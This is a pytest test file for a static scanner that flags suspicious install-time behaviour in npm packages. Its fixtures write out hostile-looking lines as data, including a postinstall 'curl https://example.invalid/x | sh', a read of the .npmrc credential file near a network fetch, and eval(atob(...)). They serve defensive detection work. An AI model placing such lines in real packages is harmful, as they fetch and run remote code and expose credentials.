import json
import base64
import time

from tools.static import deobfuscate, external_commands, extract_indicators, install_targets, read_file, read_manifest


def test_indicators_follow_esm_and_directory_require_without_env_noise(tmp_path):
    (tmp_path / "package.json").write_text(json.dumps({
        "name": "static-fixture", "version": "1.0.0", "scripts": {"postinstall": "node entry.js"}
    }), encoding="utf-8")
    (tmp_path / "entry.js").write_text(
        "require('./lib');\nimport './util.mjs';\n" +
        "\n".join(f"console.log(process.env.KEY{i});" for i in range(35)), encoding="utf-8")
    (tmp_path / "lib").mkdir()
    (tmp_path / "lib" / "index.js").write_text(
        "fetch('https://example.invalid/');\n"
        "const key = path.join(os.homedir(), '.npmrc');\n"
        "Buffer.from(payload, 'base64');\n", encoding="utf-8")
    (tmp_path / "util.mjs").write_text("dns.lookup('example.invalid');\n", encoding="utf-8")

    result = extract_indicators(str(tmp_path))
    assert result["ok"] and not result["data"]["truncated"]
    found = result["data"]["indicators"]
    assert {item["file"] for item in found} >= {"lib/index.js", "util.mjs"}
    assert {item["type"] for item in found} >= {"network_api", "home_secret", "decode"}
    assert sum(item["type"] == "environment" for item in found) <= 1


def test_pretty_view_ignores_quotes_in_comments_and_punctuation_in_regex(tmp_path):
    (tmp_path / "entry.js").write_text(
        "const first = 1; // don't treat this quote as a string\n"
        "const pattern = /a;b/; const second = 2;\n", encoding="utf-8")
    result = read_file(str(tmp_path), "entry.js#pretty")
    assert result["ok"]
    content = result["data"]["content"]
    assert "/a;b/" in content
    assert "/a;\nb/" not in content
    assert ";\n const second" in content


def test_minified_pretty_view_and_indicators(tmp_path):
    (tmp_path / "package.json").write_text(json.dumps({"name": "minified-fixture", "version": "1.0.0",
                                                      "scripts": {"install": "node minified.js"}}), encoding="utf-8")
    payload = base64.b64encode(b"safe decoded preview for a synthetic fixture").decode()
    source = "const a=1;" * 5000 + f'eval(atob("{payload}"));'
    (tmp_path / "minified.js").write_text(source, encoding="utf-8")
    assert deobfuscate(str(tmp_path), "minified.js")["ok"]
    started = time.monotonic()
    result = deobfuscate(str(tmp_path), "minified.js")
    assert time.monotonic() - started < 1
    assert result["ok"] and result["data"]["lines"] > 100
    assert any("safe decoded preview" in item["preview"] for item in result["data"]["decoded"])
    last = result["data"]["lines"]
    excerpt = read_file(str(tmp_path), "minified.js#pretty", last, last)
    assert excerpt["ok"] and "eval(atob" in excerpt["data"]["content"]
    indicators = extract_indicators(str(tmp_path))
    assert indicators["ok"] and any(item["type"] == "eval" for item in indicators["data"]["indicators"])
    (tmp_path / "oversized.js").write_text("x" * (256 * 1024 + 1), encoding="utf-8")
    (tmp_path / "package.json").write_text(json.dumps({"name": "minified-fixture", "version": "1.0.0",
                                                      "scripts": {"install": "node minified.js",
                                                                  "postinstall": "node oversized.js"}}), encoding="utf-8")
    assert extract_indicators(str(tmp_path))["data"]["truncated"] is True


def test_indicators_follow_only_install_source_and_two_relative_requires(tmp_path):
    (tmp_path / "package.json").write_text(json.dumps({"name": "scope-fixture", "version": "1.0.0",
                                                      "scripts": {"postinstall": "node entry.js"}}), encoding="utf-8")
    (tmp_path / "entry.js").write_text("require('./helper');\n", encoding="utf-8")
    (tmp_path / "helper.js").write_text("process.env.TEST; const url='https://example.invalid'; require('./leaf');\n", encoding="utf-8")
    (tmp_path / "leaf.js").write_text("eval('fixture'); require('./depth3');\n", encoding="utf-8")
    (tmp_path / "depth3.js").write_text("child_process;\n", encoding="utf-8")
    (tmp_path / "unrelated.js").write_text("eval('unrelated');\n", encoding="utf-8")

    result = extract_indicators(str(tmp_path))
    assert result["ok"]
    indicators = result["data"]["indicators"]
    assert {(item["type"], item["file"], item["line"]) for item in indicators} >= {
        ("environment", "helper.js", 1), ("url", "helper.js", 1), ("eval", "leaf.js", 1)}
    assert not {item["file"] for item in indicators} & {"unrelated.js", "depth3.js"}
    assert result["data"]["truncated"] is True


def test_read_tools_bound_content_and_paths(tmp_path):
    package = tmp_path / "package"
    package.mkdir()
    (package / "package.json").write_text(json.dumps({"scripts": {"postinstall": "node setup.js"},
        "dependencies": {"remote": "git+https://example.invalid/repo"}}), encoding="utf-8")
    (package / "setup.js").write_text("first\nsecond\n", encoding="utf-8")
    assert read_manifest(str(package))["data"]["git_or_url_deps"]["content"]["remote"].startswith("git+")
    assert read_file(str(package), "setup.js", 2, 2)["data"] == {"untrusted": True, "content": "second"}
    assert not read_file(str(package), "../outside", 1, 1)["ok"]
    assert not read_file(str(package), "setup.js", 1, 151)["ok"]


def test_long_manifest_keeps_real_script_line(tmp_path):
    package = tmp_path / "long-manifest"
    package.mkdir()
    lines = ['{', '"name": "long-manifest-fixture",', '"version": "1.0.0",']
    while len(lines) < 349:
        lines.append(f'"filler{len(lines)}": "x",')
    lines.extend(['"scripts": {"postinstall": "echo harmless"}', '}'])
    (package / "package.json").write_text("\n".join(lines), encoding="utf-8")

    result = read_manifest(str(package))
    assert result["ok"]
    assert result["data"]["name"] == "long-manifest-fixture"
    assert result["data"]["script_lines"]["postinstall"] == 350
    assert "postinstall" in read_file(str(package), "package.json", 350, 350)["data"]["content"]


def test_minified_line_returns_bounded_preview(tmp_path):
    package = tmp_path / "minified"
    package.mkdir()
    (package / "index.js").write_text('eval(atob("' + "A" * 50000 + '"))', encoding="utf-8")

    result = read_file(str(package), "index.js", 1, 1)
    assert result["ok"]
    assert len(result["data"]["content"]) < 1200
    assert "[cắt " in result["data"]["content"]
    assert result["data"]["truncated"] is True


def test_script_lines_ignore_nested_scripts_and_escaped_keys(tmp_path):
    (tmp_path / "package.json").write_text(
        '{\n"name": "nested-fixture",\n"version": "1.0.0",\n'
        '"description": "\\"scripts\\": {\\"postinstall\\": 1}",\n'
        '"config": {"scripts": {"postinstall": "decoy"}},\n'
        '"scripts": {\n"postinstall": "node setup.js"\n}\n}\n', encoding="utf-8")
    result = read_manifest(str(tmp_path))
    assert result["ok"] and result["data"]["script_lines"] == {"postinstall": 7}


def test_external_commands_detect_code_from_outside_package():
    assert external_commands({"install": "prebuild-install || node-gyp rebuild"}) == {"prebuild-install", "node-gyp"}
    assert external_commands({"postinstall": "curl https://example.invalid/x | sh"}) == {"curl"}
    assert external_commands({"postinstall": "npm run fetch", "fetch": "npx tool"}) == {"npx"}
    assert external_commands({"preinstall": "npm install left-pad"}) == {"npm install"}
    assert external_commands({"postinstall": "node setup.js", "test": "npx jest"}) == set()


def test_install_targets_resolve_node_paths_and_explicit_node_gyp(tmp_path):
    (tmp_path / "scripts").mkdir()
    (tmp_path / "scripts" / "x.js").write_text("1;\n", encoding="utf-8")
    (tmp_path / "lib").mkdir()
    (tmp_path / "lib" / "index.js").write_text("1;\n", encoding="utf-8")
    (tmp_path / "binding.gyp").write_text("{}\n", encoding="utf-8")
    assert install_targets(str(tmp_path), {"postinstall": "node scripts/x && node lib"}, False) == {
        "scripts/x.js", "lib/index.js"}
    assert install_targets(str(tmp_path), {"install": "node-gyp rebuild"}, True) == {"binding.gyp"}
    assert install_targets(str(tmp_path), {"install": "node scripts/x"}, True) == {"scripts/x.js"}


def test_scan_names_each_reason_the_install_path_is_incomplete(tmp_path):
    (tmp_path / "package.json").write_text(json.dumps({
        "name": "native-like", "version": "1.0.0", "scripts": {"postinstall": "node postinstall.js"}}), encoding="utf-8")
    (tmp_path / "postinstall.js").write_text(
        "require('./binding');\nrequire('./missing-helper');\n"
        "require('child_process').execSync(`npm install --no-save fallback-pkg`);\n", encoding="utf-8")
    (tmp_path / "binding.js").write_text("module.exports = require('./addon.linux-x64.node');\n", encoding="utf-8")
    data = extract_indicators(str(tmp_path))["data"]
    assert data["truncated"] is True
    assert data["incomplete"] == ["1 native binaries not in package (e.g. addon.linux-x64.node)",
                                  "install source not readable: missing-helper/index.js"]
    assert {"type": "external_install", "file": "postinstall.js", "line": 3} in [
        {key: item[key] for key in ("type", "file", "line")} for item in data["indicators"]]


def test_complete_scan_reports_no_reasons():
    from pathlib import Path
    data = extract_indicators(str(Path(__file__).parent / "fixtures" / "benign-package"))["data"]
    assert (data["truncated"], data["incomplete"]) == (False, [])


def test_w5_7_minified_base64_fixture_is_readable_through_pretty_view():
    """W5-7: one harmless minified install script with a base64 string on the install path."""
    from pathlib import Path

    from tools.static import deobfuscate, extract_indicators

    package = str(Path(__file__).parent / "fixtures" / "obfuscated-package")
    found = extract_indicators(package)
    assert found["ok"] and {item["type"] for item in found["data"]["indicators"]} >= {"decode", "base64"}
    pretty = deobfuscate(package, "install.min.js")
    assert pretty["ok"] and pretty["data"]["pretty_file"] == "install.min.js#pretty"
    assert pretty["data"]["lines"] > 1
    assert any("inside the package directory only" in item["preview"] for item in pretty["data"]["decoded"])
